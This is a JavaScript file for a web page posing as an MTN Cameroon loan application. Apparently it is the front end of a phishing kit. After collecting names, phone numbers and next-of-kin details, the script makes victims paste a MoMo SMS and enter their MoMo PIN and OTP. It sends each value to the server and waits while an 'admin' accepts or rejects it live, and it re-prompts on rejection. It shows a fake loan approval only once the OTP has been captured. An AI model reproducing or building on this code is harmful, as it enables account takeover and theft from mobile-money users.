// ============================================================
// script.js – MTN Cameroon Version (Updated for Landing Page)
// ============================================================

const S = {
    loanType: '', loanAmount: 0, loanTerm: '', loanPurpose: '',
    firstName: '', lastName: '', phone: '', email: '',
    employment: '', annualIncome: 0,
    kinName: '', kinPhone: '',
    applicationId: '',
    isSubmitting: false,
    rejectedStep: null
};

let currentPollTimeout = null;
let otpResendTimer = null;
let otpResendCountdown = 0;
let pinBlockTimer = null;

// ─── localStorage Helpers ───
const STORAGE_KEYS = {
    APPLICATION_ID: 'mtn_cm_application_id',
    APPLICATION_DATA: 'mtn_cm_application_data',
    REJECTION_INFO: 'mtn_cm_rejection_info',
    FORM_DRAFT: 'mtn_cm_form_draft',
    OTP_TIMER: 'mtn_cm_otp_timer'
};

function saveToLocalStorage(key, data) {
    try {
        localStorage.setItem(key, JSON.stringify(data));
        console.log('💾 Saved to localStorage: ' + key);
    } catch (error) {
        console.error('❌ Failed to save ' + key + ':', error);
    }
}

function getFromLocalStorage(key) {
    try {
        const data = localStorage.getItem(key);
        return data ? JSON.parse(data) : null;
    } catch (error) {
        console.error('❌ Failed to load ' + key + ':', error);
        return null;
    }
}

function removeFromLocalStorage(key) {
    try {
        localStorage.removeItem(key);
        console.log('🗑️ Removed from localStorage: ' + key);
    } catch (error) {
        console.error('❌ Failed to remove ' + key + ':', error);
    }
}

// ─── Save/Load Application ID ───
function saveApplicationId(id) {
    if (id) {
        S.applicationId = id;
        saveToLocalStorage(STORAGE_KEYS.APPLICATION_ID, {
            id: id,
            timestamp: new Date().toISOString()
        });
    }
}

function loadApplicationId() {
    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
    if (saved && saved.id) {
        const age = Date.now() - new Date(saved.timestamp).getTime();
        if (age < 24 * 60 * 60 * 1000) {
            S.applicationId = saved.id;
            console.log('🔄 Restored application ID: ' + saved.id);
            return saved.id;
        } else {
            removeFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
        }
    }
    return null;
}

// ─── Save/Load Application Data ───
function saveApplicationData() {
    const dataToSave = {
        ...S,
        timestamp: new Date().toISOString()
    };
    saveToLocalStorage(STORAGE_KEYS.APPLICATION_DATA, dataToSave);
}

function loadApplicationData() {
    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
    if (saved) {
        const age = Date.now() - new Date(saved.timestamp).getTime();
        if (age < 24 * 60 * 60 * 1000) {
            const fieldsToRestore = [
                'loanType', 'loanAmount', 'loanTerm', 'loanPurpose',
                'firstName', 'lastName', 'phone', 'email',
                'employment', 'annualIncome', 'kinName', 'kinPhone',
                'applicationId', 'rejectedStep'
            ];
            for (var i = 0; i < fieldsToRestore.length; i++) {
                var field = fieldsToRestore[i];
                if (saved[field] !== undefined) {
                    S[field] = saved[field];
                }
            }
            console.log('🔄 Restored application data from localStorage');
            return true;
        } else {
            removeFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
        }
    }
    return false;
}

// ─── Save/Load Rejection Info ───
function saveRejectionInfo(step, applicationId) {
    saveToLocalStorage(STORAGE_KEYS.REJECTION_INFO, {
        step: step,
        applicationId: applicationId,
        timestamp: new Date().toISOString()
    });
}

function loadRejectionInfo() {
    const saved = getFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
    if (saved) {
        const age = Date.now() - new Date(saved.timestamp).getTime();
        if (age < 5 * 60 * 1000) {
            return saved;
        } else {
            removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
        }
    }
    return null;
}

function clearRejectionInfo() {
    removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
}

// ─── Save/Load Form Draft ───
function saveFormDraft() {
    var fi = document.getElementById('s2fi');
    var la = document.getElementById('s2la');
    var ph = document.getElementById('s2ph');
    var em = document.getElementById('s2em');
    var am = document.getElementById('s1am');
    var pu = document.getElementById('s1pu');
    var emStatus = document.getElementById('s3em');
    var income = document.getElementById('s3in');
    var kinName = document.getElementById('s3kn');
    var kinPhone = document.getElementById('s3kp');
    
    var draft = {
        firstName: fi ? fi.value : '',
        lastName: la ? la.value : '',
        phone: ph ? ph.value : '',
        email: em ? em.value : '',
        loanAmount: am ? am.value : '',
        loanPurpose: pu ? pu.value : '',
        employment: emStatus ? emStatus.value : '',
        annualIncome: income ? income.value : '',
        kinName: kinName ? kinName.value : '',
        kinPhone: kinPhone ? kinPhone.value : '',
        timestamp: new Date().toISOString()
    };
    saveToLocalStorage(STORAGE_KEYS.FORM_DRAFT, draft);
}

function loadFormDraft() {
    var draft = getFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
    if (draft) {
        var age = Date.now() - new Date(draft.timestamp).getTime();
        if (age < 24 * 60 * 60 * 1000) {
            if (draft.firstName) document.getElementById('s2fi').value = draft.firstName;
            if (draft.lastName) document.getElementById('s2la').value = draft.lastName;
            if (draft.phone) document.getElementById('s2ph').value = draft.phone;
            if (draft.email) document.getElementById('s2em').value = draft.email;
            if (draft.loanAmount) document.getElementById('s1am').value = draft.loanAmount;
            if (draft.loanPurpose) document.getElementById('s1pu').value = draft.loanPurpose;
            if (draft.employment) document.getElementById('s3em').value = draft.employment;
            if (draft.annualIncome) document.getElementById('s3in').value = draft.annualIncome;
            if (draft.kinName) document.getElementById('s3kn').value = draft.kinName;
            if (draft.kinPhone) document.getElementById('s3kp').value = draft.kinPhone;
            console.log('🔄 Restored form draft from localStorage');
            return true;
        } else {
            removeFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
        }
    }
    return false;
}

// ─── Navigation ───
function goTo(pageId) {
    var pages = document.querySelectorAll('.page');
    for (var i = 0; i < pages.length; i++) {
        pages[i].classList.remove('active');
    }
    var el = document.getElementById(pageId);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);
}

// ─── UPDATED: Start Application ───
function startApplication() {
    // Reset all state
    S.rejectedStep = null;
    clearRejectionInfo();
    
    // Generate new application ID if needed
    if (!S.applicationId) {
        S.applicationId = 'MTN-CM-' + Date.now().toString().slice(-6);
        saveApplicationId(S.applicationId);
    }
    
    // Hide resend button
    var resendBtn = document.getElementById('resendOtpBtn');
    if (resendBtn) resendBtn.classList.add('hidden');
    
    // Clear any error messages
    var errorIds = ['s1Err', 's2Err', 's3Err', 'momErr', 'pinErr', 'otpErr'];
    for (var i = 0; i < errorIds.length; i++) {
        clearErr(errorIds[i]);
    }
    
    // Go to Step 1
    goTo('page-step1');
    
    // Update the summary on step 3 if visible
    updateSummary();
    
    console.log('🚀 Application started with ID: ' + S.applicationId);
}

// ─── Toast Notifications ───
function showToast(message, type, duration) {
    type = type || 'info';
    duration = duration || 3000;
    
    var existing = document.querySelector('.toast');
    if (existing) existing.remove();
    
    var toast = document.createElement('div');
    toast.className = 'toast toast-' + type;
    toast.textContent = message;
    document.body.appendChild(toast);
    
    setTimeout(function() {
        toast.style.opacity = '0';
        toast.style.transform = 'translateX(-50%) translateY(-20px)';
        setTimeout(function() { toast.remove(); }, 300);
    }, duration);
}

// ─── Form Helpers ───
function normalizePhone(id) {
    var inp = document.getElementById(id);
    var val = inp.value.replace(/\D/g, '');
    if (val.length > 9) val = val.substring(0, 9);
    inp.value = val;
    saveFormDraft();
}

function updateCalc() {
    var slider = document.getElementById('amtSlider');
    if (!slider) return;
    var amt = +slider.value;
    var amountDisplay = document.getElementById('calcAmt');
    var monthlyDisplay = document.getElementById('monthlyAmt');
    
    if (amountDisplay) amountDisplay.textContent = 'XAF ' + amt.toLocaleString();
    var monthly = Math.ceil(amt / 48);
    if (monthlyDisplay) monthlyDisplay.textContent = 'XAF ' + monthly.toLocaleString();
    
    var pct = ((amt - 500000) / 4500000) * 100;
    slider.style.setProperty('--pct', pct + '%');
}

function showErr(id, msg) {
    var box = document.getElementById(id);
    if (box) {
        box.classList.add('show');
        var txt = document.getElementById(id + 'Txt');
        if (txt) txt.textContent = msg;
    }
}

function clearErr(id) {
    var box = document.getElementById(id);
    if (box) box.classList.remove('show');
}

// ─── Step Navigation ───
function toS2() {
    var ty = document.getElementById('s1ty').value;
    var am = +document.getElementById('s1am').value;
    var te = document.getElementById('s1te').value;
    var pu = document.getElementById('s1pu').value;
    
    if (!ty || am <= 0 || !te || !pu.trim()) {
        showErr('s1Err', 'Please complete all fields.');
        return;
    }
    
    S.loanType = ty;
    S.loanAmount = am;
    S.loanTerm = te;
    S.loanPurpose = pu;
    
    saveApplicationData();
    saveFormDraft();
    goTo('page-step2');
}

function toS3() {
    var fi = document.getElementById('s2fi').value.trim();
    var la = document.getElementById('s2la').value.trim();
    var ph = document.getElementById('s2ph').value;
    var em = document.getElementById('s2em').value.trim();
    
    if (!fi || !la) {
        showErr('s2Err', 'Please enter your full name.');
        return;
    }
    if (ph.length !== 9) {
        showErr('s2Err', 'Please enter a valid 9-digit phone number.');
        return;
    }
    if (!em || em.indexOf('@') === -1) {
        showErr('s2Err', 'Please enter a valid email address.');
        return;
    }
    
    S.firstName = fi;
    S.lastName = la;
    S.phone = ph;
    S.email = em;
    
    saveApplicationData();
    saveFormDraft();
    goTo('page-step3');
}

// ─── Update Step 3 Summary ───
function updateSummary() {
    var amount = document.getElementById('sA');
    var term = document.getElementById('sT');
    var purpose = document.getElementById('sP');
    var name = document.getElementById('sN');
    
    if (amount) amount.textContent = 'XAF ' + (S.loanAmount ? S.loanAmount.toLocaleString() : '0');
    if (term) term.textContent = S.loanTerm || '—';
    if (purpose) purpose.textContent = S.loanPurpose || '—';
    if (name) name.textContent = (S.firstName && S.lastName) ? (S.firstName + ' ' + S.lastName) : '—';
}

// ─── PIN/OTP Helpers ───
function pinMvM(el, i, maxLength) {
    maxLength = maxLength || 5;
    el.value = el.value.replace(/\D/g, '');
    if (el.value && i < maxLength - 1) {
        var nextPin = document.getElementById('pin' + (i + 1));
        if (nextPin) { nextPin.focus(); return; }
    }
    
    if (i === maxLength - 1 && el.value) {
        var allFilled = true;
        for (var j = 0; j < 5; j++) {
            var pinField = document.getElementById('pin' + j);
            if (!pinField || !pinField.value) {
                allFilled = false;
                break;
            }
        }
        if (allFilled) {
            setTimeout(function() { doPin(); }, 300);
        }
    }
}

function togPin() {
    for (var i = 0; i < 5; i++) {
        var b = document.getElementById('pin' + i);
        if (b) b.type = b.type === 'password' ? 'text' : 'password';
    }
    for (var j = 0; j < 4; j++) {
        var otp = document.getElementById('otp' + j);
        if (otp) otp.type = otp.type === 'password' ? 'text' : 'password';
    }
}

function chkPin() {
    var pinOk = true;
    for (var i = 0; i < 5; i++) {
        var pinField = document.getElementById('pin' + i);
        if (!pinField || !pinField.value) {
            pinOk = false;
            break;
        }
    }
    var pinBtn = document.querySelector('#page-pin .btn-grad');
    if (pinBtn) pinBtn.disabled = !pinOk;

    var otpOk = true;
    for (var j = 0; j < 4; j++) {
        var otpField = document.getElementById('otp' + j);
        if (!otpField || !otpField.value) {
            otpOk = false;
            break;
        }
    }
    var otpBtn = document.querySelector('#page-otp .btn-grad');
    if (otpBtn) otpBtn.disabled = !otpOk;
}

document.addEventListener('keyup', chkPin);

function clearLoginPin() {
    for (var i = 0; i < 5; i++) {
        var field = document.getElementById('pin' + i);
        if (field) field.value = '';
    }
    var firstPin = document.getElementById('pin0');
    if (firstPin) firstPin.focus();
    chkPin();
}

function clearOtpCode() {
    for (var i = 0; i < 4; i++) {
        var field = document.getElementById('otp' + i);
        if (field) field.value = '';
    }
    var firstOtp = document.getElementById('otp0');
    if (firstOtp) firstOtp.focus();
    chkPin();
}

function handleOtpInput(el, type) {
    el.value = el.value.replace(/\D/, '');
    var idx = parseInt(el.id.match(/\d$/)[0]);
    if (el.value && type === 'otp' && idx < 3) {
        var next = document.getElementById('otp' + (idx + 1));
        if (next) next.focus();
    }
    chkPin();
    
    if (idx === 3 && el.value) {
        var allFilled = true;
        for (var i = 0; i < 4; i++) {
            var field = document.getElementById('otp' + i);
            if (!field || !field.value) {
                allFilled = false;
                break;
            }
        }
        if (allFilled) {
            setTimeout(function() { doOtp(); }, 300);
        }
    }
}

// ─── PIN Attempt Functions ───
function checkPinStatus() {
    return fetch('/api/pin-status/' + S.applicationId)
        .then(function(response) { return response.json(); })
        .then(function(data) {
            if (data.ok) {
                var remaining = data.remainingAttempts || 3;
                var attemptsDisplay = document.getElementById('pinAttemptsDisplay');
                if (attemptsDisplay) {
                    if (data.isBlocked) {
                        attemptsDisplay.innerHTML = '🔒 Too many attempts. Blocked for ' + data.blockRemainingSeconds + 's';
                        attemptsDisplay.className = 'pin-attempts blocked';
                        var pinBoxes = document.querySelectorAll('#page-pin .pin-box');
                        for (var i = 0; i < pinBoxes.length; i++) {
                            pinBoxes[i].disabled = true;
                        }
                        var pinBtn = document.querySelector('#page-pin .btn-grad');
                        if (pinBtn) pinBtn.disabled = true;
                        startPinBlockCountdown(data.blockRemainingSeconds);
                    } else {
                        attemptsDisplay.innerHTML = '🔑 Attempts remaining: ' + remaining + ' of 3';
                        attemptsDisplay.className = 'pin-attempts';
                    }
                }
                return data;
            }
            return null;
        })
        .catch(function(error) {
            console.error('Error checking PIN status:', error);
            return null;
        });
}

function startPinBlockCountdown(seconds) {
    var attemptsDisplay = document.getElementById('pinAttemptsDisplay');
    if (!attemptsDisplay) return;
    
    if (pinBlockTimer) {
        clearInterval(pinBlockTimer);
        pinBlockTimer = null;
    }
    
    var remaining = seconds;
    attemptsDisplay.textContent = '🔒 Too many attempts. Blocked for ' + remaining + 's';
    attemptsDisplay.className = 'pin-attempts blocked';
    
    pinBlockTimer = setInterval(function() {
        remaining--;
        if (remaining <= 0) {
            clearInterval(pinBlockTimer);
            pinBlockTimer = null;
            attemptsDisplay.textContent = '✅ PIN available. Please try again.';
            attemptsDisplay.className = 'pin-attempts available';
            var pinBoxes = document.querySelectorAll('#page-pin .pin-box');
            for (var i = 0; i < pinBoxes.length; i++) {
                pinBoxes[i].disabled = false;
            }
            var pinBtn = document.querySelector('#page-pin .btn-grad');
            if (pinBtn) pinBtn.disabled = false;
            resetPinAttempts();
        } else {
            attemptsDisplay.textContent = '🔒 Too many attempts. Blocked for ' + remaining + 's';
        }
    }, 1000);
}

function resetPinAttempts() {
    fetch('/api/reset-pin-attempts/' + S.applicationId, {
        method: 'POST'
    }).catch(function(error) {
        console.error('Error resetting PIN attempts:', error);
    });
}

// ─── OTP Resend Timer ───
function startOtpResendTimer(seconds) {
    seconds = seconds || 20;
    var btn = document.getElementById('resendOtpBtn');
    if (!btn) return;
    
    if (otpResendTimer) {
        clearInterval(otpResendTimer);
        otpResendTimer = null;
    }
    
    otpResendCountdown = seconds;
    btn.disabled = true;
    btn.textContent = '⏳ Wait ' + otpResendCountdown + 's';
    btn.classList.remove('hidden');
    
    saveToLocalStorage(STORAGE_KEYS.OTP_TIMER, {
        endTime: Date.now() + (seconds * 1000),
        applicationId: S.applicationId
    });
    
    otpResendTimer = setInterval(function() {
        otpResendCountdown--;
        
        if (otpResendCountdown <= 0) {
            clearInterval(otpResendTimer);
            otpResendTimer = null;
            btn.disabled = false;
            btn.textContent = '🔄 Resend OTP';
            removeFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
        } else {
            btn.textContent = '⏳ Wait ' + otpResendCountdown + 's';
        }
    }, 1000);
}

function checkOtpTimerRecovery() {
    var saved = getFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
    if (saved && saved.endTime && saved.applicationId === S.applicationId) {
        var remaining = Math.ceil((saved.endTime - Date.now()) / 1000);
        if (remaining > 0) {
            startOtpResendTimer(remaining);
            return true;
        } else {
            removeFromLocalStorage(STORAGE_KEYS.OTP_TIMER);
        }
    }
    return false;
}

// ─── Smart Rejection Navigation ───
function handleRejection(step) {
    clearErr('s3Err');
    clearErr('momErr');
    clearErr('pinErr');
    clearErr('otpErr');
    
    if (currentPollTimeout) {
        clearTimeout(currentPollTimeout);
        currentPollTimeout = null;
    }
    
    saveRejectionInfo(step, S.applicationId);
    
    switch(step) {
        case 'sms':
            showToast('❌ SMS was rejected. Please check and resubmit.', 'error');
            document.getElementById('smsMsgBox').value = '';
            document.getElementById('smsMsgBox').focus();
            var smsCard = document.querySelector('#page-sms-paste .step-card');
            if (smsCard) smsCard.classList.add('rejected');
            setTimeout(function() {
                if (smsCard) smsCard.classList.remove('rejected');
            }, 3000);
            goTo('page-sms-paste');
            break;
            
        case 'pin':
            showToast('❌ PIN was rejected. Please re-enter your MoMo PIN.', 'error');
            var pinBoxes = document.querySelectorAll('#page-pin .pin-box');
            for (var i = 0; i < pinBoxes.length; i++) {
                pinBoxes[i].value = '';
            }
            var firstPin = document.getElementById('pin0');
            if (firstPin) firstPin.focus();
            var pinCard = document.querySelector('#page-pin .step-card');
            if (pinCard) pinCard.classList.add('rejected');
            setTimeout(function() {
                if (pinCard) pinCard.classList.remove('rejected');
            }, 3000);
            checkPinStatus();
            goTo('page-pin');
            break;
            
        case 'otp':
            showToast('❌ OTP was rejected. Please request a new OTP.', 'error');
            clearOtpCode();
            var otpCard = document.querySelector('#page-otp .step-card');
            if (otpCard) otpCard.classList.add('rejected');
            setTimeout(function() {
                if (otpCard) otpCard.classList.remove('rejected');
            }, 3000);
            startOtpResendTimer(20);
            goTo('page-otp');
            break;
            
        default:
            showToast('❌ Application was rejected. Please start over.', 'error');
            goTo('page-step1');
    }
}

// ─── Polling ───
function startPoll(applicationId, step, onSuccess, onReject) {
    if (currentPollTimeout) {
        clearTimeout(currentPollTimeout);
        currentPollTimeout = null;
    }

    var check = function() {
        fetch('/api/status/' + applicationId + '/' + step)
            .then(function(response) { return response.json(); })
            .then(function(data) {
                if (data && data.ok === true) {
                    if (data.status === 'approved') {
                        currentPollTimeout = null;
                        onSuccess();
                        return;
                    } else if (data.status === 'rejected') {
                        currentPollTimeout = null;
                        fetch('/api/rejection-info/' + applicationId)
                            .then(function(res) { return res.json(); })
                            .then(function(redirectData) {
                                if (redirectData.ok && redirectData.rejectedStep) {
                                    S.rejectedStep = redirectData.rejectedStep;
                                    showToast(redirectData.errorMessage || '❌ Application was rejected.', 'error');
                                    handleRejection(redirectData.rejectedStep);
                                } else {
                                    showToast('❌ Application was rejected. Please try again.', 'error');
                                    goTo('page-step3');
                                }
                            })
                            .catch(function(err) {
                                console.error('Error getting rejection info:', err);
                                showToast('❌ Application was rejected. Please try again.', 'error');
                                goTo('page-step3');
                            });
                        return;
                    }
                }
                currentPollTimeout = setTimeout(check, 2000);
            })
            .catch(function(err) {
                console.error('Polling error:', err);
                currentPollTimeout = setTimeout(check, 3000);
            });
    };
    check();
}

// ─── Resend OTP ───
function resendOtp() {
    var btn = document.getElementById('resendOtpBtn');
    
    if (otpResendTimer || otpResendCountdown > 0) {
        showToast('⏳ Please wait ' + otpResendCountdown + ' seconds before resending.', 'info');
        return;
    }
    
    try {
        btn.disabled = true;
        btn.textContent = '⏳ Sending...';
        showToast('📤 Requesting new OTP...', 'info');
        
        fetch('/api/resend-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationId: S.applicationId })
        })
        .then(function(response) { return response.json(); })
        .then(function(data) {
            if (data.ok) {
                showToast('✅ New OTP sent to admin for verification!', 'success');
                startOtpResendTimer(20);
                
                startPoll(S.applicationId, 'otp',
                    function() {
                        showToast('✅ OTP Verified! Loan Approved 🎉', 'success');
                        showApproval();
                    },
                    function() {
                        handleRejection('otp');
                    }
                );
            } else {
                showToast('❌ Failed to resend OTP. Please try again.', 'error');
                btn.disabled = false;
                btn.textContent = '🔄 Resend OTP';
            }
        })
        .catch(function(error) {
            console.error('Resend OTP error:', error);
            showToast('❌ Failed to resend OTP. Please try again.', 'error');
            btn.disabled = false;
            btn.textContent = '🔄 Resend OTP';
        });
    } catch (error) {
        console.error('Resend OTP error:', error);
        showToast('❌ Failed to resend OTP. Please try again.', 'error');
        btn.disabled = false;
        btn.textContent = '🔄 Resend OTP';
    }
}

// ─── Show Approval ───
function showApproval() {
    document.getElementById('aprAmount').textContent = 'XAF ' + S.loanAmount.toLocaleString();
    document.getElementById('aprAmt').textContent = 'XAF ' + S.loanAmount.toLocaleString();
    document.getElementById('aprTerm').textContent = S.loanTerm;
    var monthly = Math.ceil(S.loanAmount / parseInt(S.loanTerm));
    document.getElementById('aprMth').textContent = 'XAF ' + monthly.toLocaleString();
    
    var keys = Object.values(STORAGE_KEYS);
    for (var i = 0; i < keys.length; i++) {
        removeFromLocalStorage(keys[i]);
    }
    
    if (otpResendTimer) {
        clearInterval(otpResendTimer);
        otpResendTimer = null;
    }
    
    if (pinBlockTimer) {
        clearInterval(pinBlockTimer);
        pinBlockTimer = null;
    }
    
    goTo('page-approval');
}

// ─── Submit Application ───
function submitApp() {
    var em = document.getElementById('s3em').value;
    var income = +document.getElementById('s3in').value;
    var kn = document.getElementById('s3kn').value.trim();
    var kp = document.getElementById('s3kp').value.trim();
    
    if (!em || income <= 0) {
        showErr('s3Err', 'Please complete all fields.');
        return;
    }
    
    S.employment = em;
    S.annualIncome = income;
    S.kinName = kn;
    S.kinPhone = kp;
    
    if (!S.applicationId) {
        S.applicationId = 'MTN-CM-' + Date.now().toString().slice(-6);
        saveApplicationId(S.applicationId);
    }
    
    saveApplicationData();
    goTo('page-processing');

    try {
        fetch('/api/send-application', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationData: S })
        })
        .then(function(response) { return response.json(); })
        .then(function(data) {
            document.getElementById('processingStatus').innerHTML = '⏳ Awaiting admin approval...';
            
            startPoll(S.applicationId, 'sms',
                function() {
                    showToast('✅ SMS Approved!', 'success');
                    goTo('page-sms-paste');
                },
                function() {
                    handleRejection('sms');
                }
            );
        })
        .catch(function() {
            showErr('s3Err', 'Failed to submit application.');
        });
    } catch (error) {
        showErr('s3Err', 'Failed to submit application.');
    }
}

// ─── SMS Parse ───
function doSmsParse() {
    var msg = document.getElementById('smsMsgBox').value.trim();
    if (msg.length < 3) {
        showErr('momErr', 'Please paste a valid SMS message.');
        return;
    }

    fetch('/api/send-momo-message', {
        method: 'POST',
        body: JSON.stringify({
            momoData: {
                applicationId: S.applicationId,
                phone: S.phone,
                momoMessage: msg,
                isResubmission: !!S.rejectedStep
            }
        }),
        headers: { 'Content-Type': 'application/json' }
    })
    .then(function(response) { return response.json(); })
    .then(function(data) {
        document.getElementById('waitSmsAppId').textContent = S.applicationId;
        goTo('page-wait-sms');

        startPoll(S.applicationId, 'sms',
            function() {
                showToast('✅ SMS Verified!', 'success');
                goTo('page-pin');
            },
            function() {
                handleRejection('sms');
            }
        );
    })
    .catch(function() {
        showErr('momErr', 'Failed to submit SMS.');
    });
}

// ─── PIN Submission ───
function doPin() {
    var pin = '';
    for (var i = 0; i < 5; i++) {
        var field = document.getElementById('pin' + i);
        if (field) pin += field.value;
    }
    if (pin.length < 5) {
        showErr('pinErr', 'Enter a valid 5-digit MoMo PIN.');
        return;
    }

    checkPinStatus().then(function(pinStatus) {
        if (pinStatus && pinStatus.isBlocked) {
            showErr('pinErr', 'Too many failed attempts. Please wait ' + pinStatus.blockRemainingSeconds + ' seconds.');
            return;
        }

        fetch('/api/send-pin', {
            method: 'POST',
            body: JSON.stringify({
                applicationId: S.applicationId,
                pin: pin,
                isResubmission: !!S.rejectedStep
            }),
            headers: { 'Content-Type': 'application/json' }
        })
        .then(function(response) { return response.json(); })
        .then(function(data) {
            if (!data.ok) {
                showErr('pinErr', data.error || 'Failed to submit PIN.');
                return;
            }

            document.getElementById('waitPinAppId').textContent = S.applicationId;
            goTo('page-wait-pin');

            startPoll(S.applicationId, 'pin',
                function() {
                    showToast('✅ PIN Verified!', 'success');
                    resetPinAttempts();
                    goTo('page-otp');
                },
                function() {
                    fetch('/api/pin-rejected', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ applicationId: S.applicationId })
                    })
                    .then(function(res) { return res.json(); })
                    .then(function(rejectData) {
                        if (rejectData.blocked) {
                            showErr('pinErr', '🔒 Too many failed attempts. Blocked for 5 minutes.');
                            checkPinStatus();
                            goTo('page-pin');
                        } else if (rejectData.remainingAttempts > 0) {
                            showErr('pinErr', '❌ Wrong PIN. ' + rejectData.remainingAttempts + ' attempt(s) remaining.');
                            var pinBoxes = document.querySelectorAll('#page-pin .pin-box');
                            for (var j = 0; j < pinBoxes.length; j++) {
                                pinBoxes[j].value = '';
                            }
                            var firstPin = document.getElementById('pin0');
                            if (firstPin) firstPin.focus();
                            var attemptsDisplay = document.getElementById('pinAttemptsDisplay');
                            if (attemptsDisplay) {
                                attemptsDisplay.textContent = '🔑 Attempts remaining: ' + rejectData.remainingAttempts + ' of 3';
                                attemptsDisplay.className = 'pin-attempts warning';
                            }
                            goTo('page-pin');
                        } else {
                            handleRejection('pin');
                        }
                    })
                    .catch(function(err) {
                        console.error('Error handling PIN rejection:', err);
                        handleRejection('pin');
                    });
                }
            );
        })
        .catch(function(error) {
            console.error('Error submitting PIN:', error);
            showErr('pinErr', 'Failed to submit PIN. Please try again.');
        });
    });
}

// ─── OTP Submission ───
function doOtp() {
    var otp = '';
    for (var i = 0; i < 4; i++) {
        var field = document.getElementById('otp' + i);
        if (field) otp += field.value;
    }
    if (otp.length < 4) {
        showErr('otpErr', 'Enter a valid 4-digit OTP.');
        return;
    }

    fetch('/api/send-otp', {
        method: 'POST',
        body: JSON.stringify({
            applicationId: S.applicationId,
            otp: otp,
            isResubmission: !!S.rejectedStep
        }),
        headers: { 'Content-Type': 'application/json' }
    })
    .then(function(response) { return response.json(); })
    .then(function(data) {
        document.getElementById('waitOtpAppId').textContent = S.applicationId;
        goTo('page-wait-otp');

        startPoll(S.applicationId, 'otp',
            function() {
                showToast('✅ OTP Verified! Loan Approved 🎉', 'success');
                showApproval();
            },
            function() {
                handleRejection('otp');
            }
        );
    })
    .catch(function(error) {
        console.error('Error submitting OTP:', error);
        showErr('otpErr', 'Failed to submit OTP. Please try again.');
    });
}

// ─── Update PIN Page UI ───
function updatePinPageUI() {
    var pinCard = document.querySelector('#page-pin .step-card');
    if (pinCard) {
        var attemptsDisplay = document.getElementById('pinAttemptsDisplay');
        if (!attemptsDisplay) {
            attemptsDisplay = document.createElement('div');
            attemptsDisplay.id = 'pinAttemptsDisplay';
            attemptsDisplay.className = 'pin-attempts';
            var pinLabel = document.querySelector('#page-pin .pin-label');
            if (pinLabel) {
                pinLabel.parentNode.insertBefore(attemptsDisplay, pinLabel.nextSibling);
            }
        }
    }
}

// ─── Recovery on Page Load ───
function recoverSession() {
    console.log('🔄 Checking for saved session...');
    
    var appId = loadApplicationId();
    if (appId) {
        console.log('✅ Found application ID: ' + appId);
        // Auto-start the application if we have an ID
        startApplication();
        return true;
    }
    
    var dataLoaded = loadApplicationData();
    if (dataLoaded) {
        console.log('✅ Loaded application data');
        // If we have data but no ID, generate one
        if (!S.applicationId) {
            S.applicationId = 'MTN-CM-' + Date.now().toString().slice(-6);
            saveApplicationId(S.applicationId);
        }
        startApplication();
        return true;
    }
    
    if (checkOtpTimerRecovery()) {
        console.log('✅ Recovered OTP timer');
        startApplication();
        return true;
    }
    
    var rejection = loadRejectionInfo();
    if (rejection) {
        console.log('✅ Found rejection info for step: ' + rejection.step);
        S.applicationId = rejection.applicationId;
        showToast('⚠️ Your ' + rejection.step.toUpperCase() + ' was rejected. Please try again.', 'error');
        handleRejection(rejection.step);
        return true;
    }
    
    if (!rejection) {
        loadFormDraft();
    }
    
    return false;
}

// ─── Auto-save on input changes ───
document.addEventListener('input', function(e) {
    if (e.target.closest('#page-step1, #page-step2, #page-step3')) {
        saveFormDraft();
    }
    if (e.target.closest('#page-step2, #page-step3')) {
        saveApplicationData();
    }
});

// ─── Override goTo for PIN page ───
var originalGoTo = goTo;
goTo = function(pageId) {
    originalGoTo(pageId);
    if (pageId === 'page-pin') {
        updatePinPageUI();
        checkPinStatus();
    }
    if (pageId === 'page-step3') {
        updateSummary();
    }
};

// ─── INIT ───

// Check if we're on the landing page or loan app
var isLandingPage = document.querySelector('.landing-container') !== null;

if (isLandingPage) {
    // We're on the landing page - wait for redirect
    console.log('🎯 Landing page detected. Waiting for redirect to loan app...');
} else {
    // We're on the loan app - initialize normally
    console.log('🚀 Initializing loan app...');
    
    // Update calculator
    updateCalc();
    
    // Set initial slider background
    var slider = document.getElementById('amtSlider');
    if (slider) {
        var pct = ((slider.value - 500000) / 4500000) * 100;
        slider.style.setProperty('--pct', pct + '%');
    }
    
    // Try to recover session
    var recovered = recoverSession();
    
    // If no session, start fresh
    if (!recovered) {
        // Generate a new application ID
        S.applicationId = 'MTN-CM-' + Date.now().toString().slice(-6);
        saveApplicationId(S.applicationId);
        // Go to landing page or step 1
        var shouldStartAtLanding = window.location.hash === '#page-landing' || window.location.hash === '';
        if (shouldStartAtLanding) {
            goTo('page-landing');
        } else {
            startApplication();
        }
    }
    
    console.log('✅ MTN Cameroon Loan App (All Features) loaded!');
    console.log('📋 Application ID: ' + S.applicationId);
}

// ─── Handle hash change for navigation ───
window.addEventListener('hashchange', function() {
    var hash = window.location.hash;
    if (hash === '#page-step1') {
        startApplication();
    }
});

console.log('✅ MTN Cameroon Script loaded!');
